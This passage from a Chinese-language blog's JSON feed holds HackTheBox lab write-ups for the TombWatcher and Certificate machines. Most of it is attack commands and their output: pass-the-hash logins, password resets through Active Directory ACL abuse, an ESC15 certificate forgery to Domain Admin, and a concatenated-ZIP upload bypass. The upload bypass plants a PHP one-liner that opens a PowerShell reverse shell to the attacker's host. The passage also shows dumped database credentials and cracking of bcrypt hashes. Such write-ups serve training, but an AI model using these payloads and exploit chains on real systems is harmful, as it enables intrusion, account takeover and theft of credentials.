Infrastructure\nansible_dev$:::1c37d00093dc2a5f25176bf2d474afdc\nansible_dev$:aes256-cts-hmac-sha1-96:526688ad2b7ead7566b70184c518ef665cc4c0215a1d634ef5f5bcda6543b5b3\nansible_dev$:aes128-cts-hmac-sha1-96:91366223f82cd8d39b0e767f0061fd9a\n```\n\n测试`ansible_dev$`的凭据\n\n```bash\n➜  TombWatcher nxc smb 10.10.11.72 -u 'ansible_dev$' -H '1c37d00093dc2a5f25176bf2d474afdc' -d tombwatcher.htb   \nSMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) \nSMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\\ansible_dev$:1c37d00093dc2a5f25176bf2d474afdc \n```\n\n### To John\n\n`ansible_dev$` 拥有更改 `SAM`用户密码的权限\n\n```bash\n➜  TombWatcher bloodyAD -d tombwatcher.htb -u 'ansible_dev$' -p ':1c37d00093dc2a5f25176bf2d474afdc' --dc-ip 10.10.11.72 set password SAM 'Password123!'\n[+] Password changed successfully!\n```\n\n测试 `SAM` 凭据\n\n```bash\n➜  TombWatcher nxc smb 10.10.11.72 -u 'SAM' -p 'Password123!' -d tombwatcher.htb\nSMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) \nSMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\\SAM:Password123! \n```\n\n我们再通过`SAM`用户修改`John`用户的密码\n\n```bash\n➜  TombWatcher bloodyAD -d tombwatcher.htb -u 'SAM' -p 'Password123!' --dc-ip 10.10.11.72 set owner john sam\n[!] S-1-5-21-1392491010-1358638721-2126982587-1105 is already the owner, no modification will be made\n\n➜  TombWatcher bloodyAD -d tombwatcher.htb -u 'SAM' -p 'Password123!' --dc-ip 10.10.11.72 add genericAll john sam\n[+] sam has now GenericAll on john\n\n➜  TombWatcher bloodyAD -d tombwatcher.htb -u 'SAM' -p 'Password123!' --dc-ip 10.10.11.72 set password JOHN 'Password123!'\n[+] Password changed successfully!\n```\n\n使用 `evil-winrm` 进行登录\n\n```bash\n➜  TombWatcher evil-winrm -i 10.10.11.72 -u 'JOHn' -p 'Password123!'                \n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\john\\Documents> \n```\n\n能读取 `user.txt`\n\n```bash\n*Evil-WinRM* PS C:\\Users\\john\\Desktop> type user.txt\n3941928223b1baf7d3a3b94a3953d597\n```\n\n## 域分析 - 2\n\n拿到 `John` 用户后，我们再进行分析一次，寻找获得`Root`的路径\n\n`John` 的权限\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image11.png)\n\n这名字带`CERT`，修改`CERT_ADMIN`密码，并用其尝试使用 `certipy` 枚举漏洞\n\n```bash\n➜  TombWatcher bloodyAD -d tombwatcher.htb -u 'JOHN' -p 'Password123!' --dc-ip 10.10.11.72 set password CERT_ADMIN 'Password123!'\n[+] Password changed successfully!\n```\n\n```bash\n➜  TombWatcher certipy-ad find -u 'CERT_ADMIN' -p 'Password123!' -dc-ip 10.10.11.72 -vulnerable\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n[*] Finding certificate templates\n[*] Found 33 certificate templates\n[*] Finding certificate authorities\n[*] Found 1 certificate authority\n[*] Found 11 enabled certificate templates\n[*] Finding issuance policies\n[*] Found 13 issuance policies\n[*] Found 0 OIDs linked to templates\n[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP\n[!] Failed to connect to remote registry. Service should be starting now. Trying again...\n[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'\n[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'\n[!] Error checking web enrollment: timed out\n[!] Use -debug to print a stacktrace\n[*] Saving text output to '20250608182737_Certipy.txt'\n[*] Wrote text output to '20250608182737_Certipy.txt'\n[*] Saving JSON output to '20250608182737_Certipy.json'\n[*] Wrote JSON output to '20250608182737_Certipy.json'\n```\n\n检测到 `ESC15`\n\n```bash\n➜  TombWatcher cat 20250608182737_Certipy.txt  \nCertificate Authorities                    \n  0                                        \n    CA Name                             : tombwatcher-CA-1\n    DNS Name                            : DC01.tombwatcher.htb\n    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb\n    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC\n    Certificate Validity Start          : 2024-11-16 00:47:48+00:00\n    Certificate Validity End            : 2123-11-16 00:57:48+00:00\n    Web Enrollment          \n      HTTP                                                                                                        \n        Enabled                         : False                                                                   \n      HTTPS                                                                                                       \n        Enabled                         : False\n    User Specified SAN                  : Disabled                                                                \n    Request Disposition                 : Issue                                                                   \n    Enforce Encryption for Requests     : Enabled                                                                 \n    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy\n    Permissions                                                                                                   \n      Owner                             : TOMBWATCHER.HTB\\Administrators\n      Access Rights                                                                                               \n        ManageCa                        : TOMBWATCHER.HTB\\Administrators\n                                          TOMBWATCHER.HTB\\Domain Admins    \n                                          TOMBWATCHER.HTB\\Enterprise Admins\n        ManageCertificates              : TOMBWATCHER.HTB\\Administrators\n                                          TOMBWATCHER.HTB\\Domain Admins\n                                          TOMBWATCHER.HTB\\Enterprise Admins                 \n        Enroll                          : TOMBWATCHER.HTB\\Authenticated Users      \nCertificate Templates\n  0\n    Template Name                       : WebServer\n    Display Name                        : Web Server\n    Certificate Authorities             : tombwatcher-CA-1\n    Enabled                             : True\n    Client Authentication               : False\n    Enrollment Agent                    : False\n    Any Purpose                         : False\n    Enrollee Supplies Subject           : True\n    Certificate Name Flag               : EnrolleeSuppliesSubject\n    Extended Key Usage                  : Server Authentication\n    Requires Manager Approval           : False\n    Requires Key Archival               : False\n    Authorized Signatures Required      : 0\n    Schema Version                      : 1\n    Validity Period                     : 2 years\n    Renewal Period                      : 6 weeks\n    Minimum RSA Key Length              : 2048\n    Template Created                    : 2024-11-16T00:57:49+00:00\n    Template Last Modified              : 2024-11-16T17:07:26+00:00\n    Permissions\n      Enrollment Permissions\n        Enrollment Rights               : TOMBWATCHER.HTB\\Domain Admins\n                                          TOMBWATCHER.HTB\\Enterprise Admins\n                                          TOMBWATCHER.HTB\\cert_admin\n      Object Control Permissions\n        Owner                           : TOMBWATCHER.HTB\\Enterprise Admins\n        Full Control Principals         : TOMBWATCHER.HTB\\Domain Admins\n                                          TOMBWATCHER.HTB\\Enterprise Admins\n        Write Owner Principals          : TOMBWATCHER.HTB\\Domain Admins\n                                          TOMBWATCHER.HTB\\Enterprise Admins\n        Write Dacl Principals           : TOMBWATCHER.HTB\\Domain Admins\n                                          TOMBWATCHER.HTB\\Enterprise Admins\n        Write Property Enroll           : TOMBWATCHER.HTB\\Domain Admins\n                                          TOMBWATCHER.HTB\\Enterprise Admins\n                                          TOMBWATCHER.HTB\\cert_admin\n    [+] User Enrollable Principals      : TOMBWATCHER.HTB\\cert_admin\n    [!] Vulnerabilities\n      ESC15                             : Enrollee supplies subject and schema version is 1.\n    [*] Remarks\n      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.\n```\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image12.png)\n\n## ESC 15\n\n> https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu\n> \n\n```bash\n➜  TombWatcher certipy-ad req \\\n    -u 'CERT_ADMIN' -p 'Password123!' \\\n    -dc-ip '10.10.11.72' -target 'DC01.tombwatcher.htb' \\\n    -ca 'tombwatcher-CA-1' -template 'WebServer' \\\n    -upn 'administrator@tombwatcher.htb' \\\n    -application-policies 'Client Authentication'\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[*] Request ID is 33\n[*] Successfully requested certificate\n[*] Got certificate with UPN 'administrator@tombwatcher.htb'\n[*] Certificate has no object SID\n[*] Try using -sid to set the object SID or see the wiki for more details\n[*] Saving certificate and private key to 'administrator.pfx'\n[*] Wrote certificate and private key to 'administrator.pfx'\n```\n\n```bash\n➜  TombWatcher certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Certificate identities:\n[*]     SAN UPN: 'administrator@tombwatcher.htb'\n[*] Connecting to 'ldaps://10.10.11.72:636'\n[*] Authenticated to '10.10.11.72' as: 'u:TOMBWATCHER\\\\Administrator'\nType help for list of commands\n\n# whoami\nu:TOMBWATCHER\\Administrator\n```\n\n我直接把 `henry` 加入管理员组和远程组\n\n```bash\n# add_user_to_group henry \"Domain Admins\"\nAdding user: Henry to group Domain Admins result: OK\n\n# add_user_to_group henry \"REMOTE MANAGEMENT USERS\"\nAdding user: Henry to group Remote Management Users result: OK\n```\n\n使用 `evil-winrm` 登录并读取 `root.txt`\n\n```bash\n*Evil-WinRM* PS C:\\Users\\administrator\\desktop> type root.txt\n6d2352d2fcafb6b19e95e737b046864c\n```\n\n## 总结\n\n一波下来直接梭哈，这次没有卡住的地方\n\n但是我打完后发现，我`BloodHound`收集信息的时候，机器已经是被人修改过的了\n\n正常来说我是不能直接在`BloodHound`中发现`CERT_ADMIN`用户的，因为它是已经被删除的用户，我需要对其进行恢复，再进行后续操作\n\n```bash\n# Enum isDeleted ADObject\nGet-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects\n```\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image13.png)\n\n```bash\n# 恢复账号\nRestore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf\n# 激活账号\nEnable-ADAccount -Identity cert_admin\n```\n\n然后才可以是用`BloodAD`进行修改密码，这里相当于给我降难度了\n\n```bash\n(Get-Acl \"AD:CN=john,CN=Users,DC=tombwatcher,DC=htb\").Access\n```",
            "url": "https://www.sunsetaction.top/2025/10/13/HackTheBoxSeason8 - TombWatcher",
            "title": "HackTheBox - Machine - TombWatcher",
            "summary": "Season8 TombWatcher https://app.hackthebox.com/machines/TombWatcher | Windows | Medium Machine Information：As is common in real life Windows pentests,...",
            "date_modified": "2025-06-08T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "HackTheBox",
                "Windows",
                "ADCS",
                "ESC15",
                "Kerberoasting"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/10/13/HackTheBoxSeason8 - Certificate",
            "content_html": "\n# Season8 - Certificate\n\n> https://app.hackthebox.com/machines/Certificate | `Windows` | `Hard`\n> \n\n## 前期踩点\n\n```bash\n➜  Certificate nmap -sT -min-rate 5000 10.10.11.71             \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 21:18 CST\nNmap scan report for 10.10.11.71\nHost is up (0.050s latency).\nNot shown: 987 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n53/tcp   open  domain\n80/tcp   open  http\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n445/tcp  open  microsoft-ds\n464/tcp  open  kpasswd5\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n3268/tcp open  globalcatLDAP\n3269/tcp open  globalcatLDAPssl\n5985/tcp open  wsman\n```\n\n```bash\n➜  Certificate nmap -sT -A -p 80,135,139,445,636,389 10.10.11.71\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 21:19 CST\nNmap scan report for 10.10.11.71\nHost is up (0.076s latency).\n\nPORT    STATE SERVICE       VERSION\n80/tcp  open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)\n|_http-title: Did not follow redirect to http://certificate.htb/\n|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30\n135/tcp open  msrpc         Microsoft Windows RPC\n139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2025-06-01T20:59:35+00:00; +7h38m38s from scanner time.\n| ssl-cert: Subject: commonName=DC01.certificate.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb\n| Not valid before: 2024-11-04T03:14:54\n|_Not valid after:  2025-11-04T03:14:54\n445/tcp open  microsoft-ds?\n636/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2025-06-01T20:59:36+00:00; +7h38m37s from scanner time.\n| ssl-cert: Subject: commonName=DC01.certificate.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb\n| Not valid before: 2024-11-04T03:14:54\n|_Not valid after:  2025-11-04T03:14:54\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2019|10 (97%)\nOS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10\nAggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Hosts: certificate.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time:\n|   date: 2025-06-01T20:58:58\n|_  start_date: N/A\n|_clock-skew: mean: 7h38m37s, deviation: 0s, median: 7h38m37s\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT      ADDRESS\n1   85.58 ms 10.10.16.1\n2   87.46 ms 10.10.11.71\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 60.74 seconds\n```\n\n刚刚尝试了`SMB`无法使用匿名账户进行访问，因为还扫描到了`80`端口，所以从`Web`下手\n\n## Web\n\n访问 `HTTP` 并采集指纹\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image.png)\n\n其中还有登录页和注册页\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image1.png)\n\n创建了一个账户 `sunset` 并使用账户进行登录，并且用户类型有`student`和`teacher`，没有发现什么登陆之后才有的功能，教师用户登录不进去\n\n扫描一下网站目录\n\n```bash\n➜  Certificate dirsearch -u http://certificate.htb/ -e php,txt,zip -x 403,404,503\n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  from pkg_resources import DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0.4.3\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, txt, zip | HTTP method: GET | Threads: 25 | Wordlist size: 10439\n\nOutput File: /root/Desktop/HackTheBox/Certificate/reports/http_certificate.htb/__25-06-01_21-34-42.txt\n\nTarget: http://certificate.htb/\n\n[21:34:42] Starting: \n[21:34:50] 200 -   14KB - /about.php\n[21:35:01] 500 -  638B  - /cgi-bin/printenv.pl\n[21:35:05] 200 -    0B  - /db.php\n[21:35:09] 200 -    3KB - /footer.php\n[21:35:10] 200 -    2KB - /header.php\n[21:35:15] 200 -    9KB - /login.php\n[21:35:15] 302 -    0B  - /logout.php  ->  login.php\n[21:35:25] 200 -   11KB - /register.php\n[21:35:30] 301 -  343B  - /static  ->  http://certificate.htb/static/\n[21:35:30] 301 -  345B  - /static..  ->  http://certificate.htb/static../\n[21:35:34] 302 -    0B  - /upload.php  ->  login.php\n\nTask Completed\n```\n\n扫描出来 `upload.php` 访问一下，貌似缺少参数\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image2.png)\n\n最后在 `course` 中可以找到上传页面\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image3.png)\n\n该处可能存在文件上传漏洞\n\n### 文件上传利用 & ZipSlip? & **ZIP Concatenation?**\n\n上传页面中提示：\n\n- Please select the assignment file you want to upload (the file will be reviewed by the course instructor)\n    \n    请选择您要上传的作业文件（该文件将由课程讲师审核）\n    \n- We accept only the following file types: `.pdf` `.docx` `.pptx` `.xlsx`\n    \n    我们只接受以下文件类型：`.pdf` `.docx` `.pptx` `.xlsx`\n    \n- You include the assignment file in .zip archive file to reduce it's size\n    \n    将任务文件包含在存档文件中`.zip`以减小其大小\n    \n\n经过测试，可以直接上传`PDF`文件，并且会检查文件头。也可以将`pdf`以`zip`格式压缩，然后上传（这里不能使用`bindzip`），上传`zip`文件之后会自动进行解压。\n\n这里对上传功能点进行了常规的测试，例如修改文件后缀名等等，但是无法成功。\n\n通过网络搜索，发现还可能存在 `ZipSlip` 漏洞\n\n> https://medium.com/@ibm_ptc_security/zip-slip-attack-e3e63a13413f\n> \n\n能达到`RCE`的效果，可以覆盖 `/etc/passwd` 文件或者公钥文件或者其他文件\n\n> 一些利用了`ZipSlip`的CTF：https://starlox.medium.com/cyberspace2024-zipzone-ctf-zipslip-vulnerability-00489669feec\n> \n\n我这里尝试了\n\n```bash\n➜  Certificate tree zip \nzip\n├── 1.pdf\n└── evil\n    └── test.php\n\n➜  Certificate zip 2.zip zip/*\n  adding: zip/1.pdf (deflated 7%)\n  adding: zip/evil/ (stored 0%)\n```\n\n然后上传`2.zip` ，但是页面不回显，无法得到上传后的文件夹路径\n\n> 别人分享的一个链接：https://perception-point.io/blog/evasive-concatenated-zip-trojan-targets-windows-users/，其中的 **Chained Archives Explained: Concatenated ZIPs** 可能对我们有效\n> \n\n```bash\n➜  Certificate ls               \n1.pdf  evil\n\n➜  Certificate ls evil   \ntest.php\n\n➜  Certificate zip -r 1.zip evil\n  adding: evil/ (stored 0%)\n  adding: evil/test.php (stored 0%)\n  \n➜  Certificate zip 2.zip 1.pdf  \n  adding: 1.pdf (deflated 7%)\n  \n➜  Certificate cat 1.zip 2.zip > 3.zip  （无法上传）\n\n➜  Certificate cat 2.zip 1.zip > 3.zip  （成功上传）\n```\n\n点击访问，并输入 `evil/test.php` 成功执行！！\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image4.png)\n\n上传一句话木马\n\n```bash\n<?php shell_exec(\"powershell -nop -w hidden -c \\\"\\$client = New-Object System.Net.Sockets.TCPClient('10.10.16.43',4444); \\$stream = \\$client.GetStream(); [byte[]]\\$bytes = 0..65535|%{0}; while((\\$i = \\$stream.Read(\\$bytes, 0, \\$bytes.Length)) -ne 0){; \\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\\$bytes,0,\\$i); \\$sendback = (iex \\$data 2>&1 | Out-String ); \\$sendback2 = \\$sendback + 'PS ' + (pwd).Path + '> '; \\$sendbyte = ([text.encoding]::ASCII).GetBytes(\\$sendback2); \\$stream.Write(\\$sendbyte,0,\\$sendbyte.Length); \\$stream.Flush()}; \\$client.Close()\\\"\");?>\n```\n\nPS：这里假如断开了，下次再连接是使用新的端口接收 shell\n\n```bash\nmalicious_files/shell.php\n```\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image5.png)\n\n## Mysql Dump\n\n我们扫描目录的时候能看到存在`db.php` ,我们将其读取\n\n```bash\n<?php\n// Database connection using PDO\ntry {\n    $dsn = 'mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4';\n    $db_user = 'certificate_webapp_user'; // Change to your DB username\n    $db_passwd = 'cert!f!c@teDBPWD'; // Change to your DB password\n    $options = [\n        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,\n        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,\n    ];\n    $pdo = new PDO($dsn, $db_user, $db_passwd, $options);\n} catch (PDOException $e) {\n    die('Database connection failed: ' . $e->getMessage());\n}\n?>\n```\n\n读取数据库的数据\n\n```bash\nPS C:\\xampp\\mysql\\bin> & \"C:\\xampp\\mysql\\bin\\mysql.exe\" -u certificate_webapp_user -p\"cert!f!c@teDBPWD\" -D Certificate_WEBAPP_DB -e \"show tables;\"\nTables_in_certificate_webapp_db\ncourse_sessions\ncourses\nusers\nusers_courses\n```\n\n```bash\nPS C:\\xampp\\mysql\\bin> & \"C:\\xampp\\mysql\\bin\\mysql.exe\" -u certificate_webapp_user -p\"cert!f!c@teDBPWD\" -D Certificate_WEBAPP_DB -e \"select * from users;\"\nid      first_name      last_name       username        email   password        created_at      role    is_active\n1       Lorra   Armessa Lorra.AAA       lorra.aaa@certificate.htb       $2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG    2024-12-23 12:43:10     teacher 1\n6       Sara    Laracrof        Sara1200        sara1200@gmail.com      $2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK    2024-12-23 12:47:11     teacher 1\n7       John    Wood    Johney  johny009@mail.com       $2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq    2024-12-23 13:18:18     student 1\n8       Havok   Watterson       havokww havokww@hotmail.com     $2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti    2024-12-24 09:08:04     teacher 1\n9       Steven  Roman   stev    steven@yahoo.com        $2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2    2024-12-24 12:05:05     student 1\n10      Sara    Brawn   sara.b  sara.b@certificate.htb  $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6    2024-12-25 21:31:26     admin   1\n12      sunset  sunset  sunset  1@q.xom $2y$04$46hjL/TUPqsT3KI7R/6tje1JOSy5.riL8ABfus1G8WZujELAgnQvy    2025-06-01 16:49:22     student 1\n13      r       r       admin   t@t.com $2y$04$ui6Qc/eaGGRKK2ovA4iJne7qbd1uSkm5lVbEHnPWWKYYwzb2s0hY2    2025-06-01 16:49:28     student 1\n14      sunset2 sunset2 sunset2 1@qq.com        $2y$04$F5Rr9QzbhhaEh7QhJKKwz.ClZdVaA9QPI9RBdy8v.G/Pc7TDAO196    2025-06-01 16:57:14     student 1\n16      admin123        admin123        admin123        admin123@gmail.com      $2y$04$ViY8NzbVBvUlwppQcDrld.mh.1XcGQkc4lt6j5Uhj7IPyGq4Z0hQu    2025-06-01 16:59:02     student 1\n17      Admin   Admin   adminsucks      admin@gmail.com $2y$04$FMa5TpAFpTDu5EwgVzybnuAJFryR18dzfSqZGLQFzHhqj/BwksTdy    2025-06-01 17:12:43     student 1\n18      admin   adnim   adminadnim      admin@adnim.com $2y$04$x.Ak4KXkM.MLNA0JgCEPxevbFuBioVs5NONlqrw.eO2js1/5AQh8i    2025-06-01 17:14:15     teacher 0\n19      1       2       3       test@test.com   $2y$04$dFR.yVKC/u9UwlPsyxa5fO11vPvZnFUhRxi2Uf25SoGQRaTE6SmBW    2025-06-01 17:16:12     teacher 0\n20      test2   test2   test2   test2@test.com  $2y$04$Ci4wfETizE9WCrUgpC4tyuI7s4oLIpK/DWb/uhjO2IKTRIfD9JUGy    2025-06-01 17:17:40     teacher 0\n22      test3   test3   test3   test3@test.com  $2y$04$m51Lz73GtqPoAzovxJeCM.B8/SAkDERIl7OBZfxAAQahNpiVFPsKe    2025-06-01 17:34:30     student 1\n```\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image6.png)\n\n其中我们感兴趣的用户有两条\n\n```bash\n10      Sara    Brawn   sara.b  sara.b@certificate.htb  $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6    2024-12-25 21:31:26     admin   1\n1       Lorra   Armessa Lorra.AAA       lorra.aaa@certificate.htb       $2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG    2024-12-23 12:43:10     teacher 1\n```\n\n对密码进行爆破\n\n```bash\n➜  Certificate john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash  \nUsing default input encoding: UTF-8\nLoaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 16 for all loaded hashes\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nBlink182         (?)   \n```\n\n爆破了好一会将`sara.b` 的密码爆破出来了\n\n测试用户有效性\n\n```bash\n➜  Certificate nxc smb 10.10.11.71 -u sara.b -p Blink182 -d certificate.htb\nSMB         10.10.11.71     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certificate.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.71     445    DC01             [+] certificate.htb\\sara.b:Blink182\n```\n\n## 域分析\n\n`bloodhound-python` 搜集信息\n\n```bash\n➜  Certificate bloodhound-python -u 'sara.b' -p 'Blink182' -d 'certificate.htb' -ns 10.10.11.71 --zip -c All -dc 'DC01.certificate.HTB'\nINFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: certificate.htb\nINFO: Getting TGT for user\nINFO: Connecting to LDAP server: DC01.certificate.HTB\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 3 computers\nINFO: Connecting to LDAP server: DC01.certificate.HTB\nINFO: Found 19 users\nINFO: Found 58 groups\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: WS-05.certificate.htb\nINFO: Querying computer: WS-01.certificate.htb\nINFO: Done in 00M 20S\nINFO: Compressing output into 20250602223438_bloodhound.zip\n```\n\n发现用户 `sara.b` 是属于 `REMOTE MANAGEMENT USERS`组的\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image7.png)\n\n并且是 `Account Operators`组的用户\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image8.png)\n\n那就是可以更改用户的密码、创建用户组等，但是不能直接修改 `admins` 组用户的密码\n\n查看一下 `Domain Admins` 组，只有 `administrator` 用户一个，故无法直接获得域权限\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image9.png)\n\n先使用 `sara.b` 登录到 `DC` 进行信息收集\n\n```bash\n➜  Certificate evil-winrm -i 10.10.11.71 -u 'sara.b' -p 'Blink182' \n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Sara.B\\Documents> \n```\n\n查看`users` 文件夹，有好几个用户，先做好打算横向到哪一个用户\n\n```bash\n*Evil-WinRM* PS C:\\Users> ls\n\n    Directory: C:\\Users\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd-----       12/30/2024   8:33 PM                Administrator\nd-----       11/23/2024   6:59 PM                akeder.kh\nd-----        11/4/2024  12:55 AM                Lion.SK\nd-r---        11/3/2024   1:05 AM                Public\nd-----        11/3/2024   7:26 PM                Ryan.K\nd-----         6/2/2025   8:17 AM                saad.m\nd-----       11/26/2024   4:12 PM                Sara.B\nd-----       12/29/2024   5:30 PM                xamppuser\n```\n\n其中最令人感兴趣的是 `LION.SK` 和 `RYAN.K`\n\n`LION.SK` 属于`DOMAIN CRA MANAGERS` 该组解释是：该安全组的成员负责为域用户发行和撤销多个证书\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image10.png)\n\n`RYAN.K` 属于 `DOMAIN STORAGE MANAGERS` 改组解释是：该安全组的成员负责量级任务，例如维护，碎片部和管理分区和磁盘\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image11.png)\n\n查看一下俩用户权限\n\n更改用户`LION.SK` 的密码\n\n```bash\n➜  Certificate bloodyAD -d certificate.htb -u 'sara.b' -p 'Blink182' --dc-ip 10.10.11.71 set password LION.SK 'Password123!!!'\n[+] Password changed successfully!\n```\n\n在 `LION.SK` 用户家目录中能得到 `user.txt`\n\n```bash\n*Evil-WinRM* PS C:\\Users\\Lion.SK\\Desktop> type user.txt\n4c634600c2be9138b12e74ac6f288176\n```\n\n枚举用户权限\n\n```bash\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\n```\n\n更改用户`RYAN.K` 的密码\n\n```bash\n➜  Certificate bloodyAD -d certificate.htb -u 'sara.b' -p 'Blink182' --dc-ip 10.10.11.71 set password RYAN.K 'Password123!!!'\n[+] Password changed successfully!\n```\n\n```bash\n➜  Certificate evil-winrm -i 10.10.11.71 -u 'RYAN.K' -p 'Password123!!!'\n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline\n                                        \nData: For more information, check Evil-WinRM GitHub: 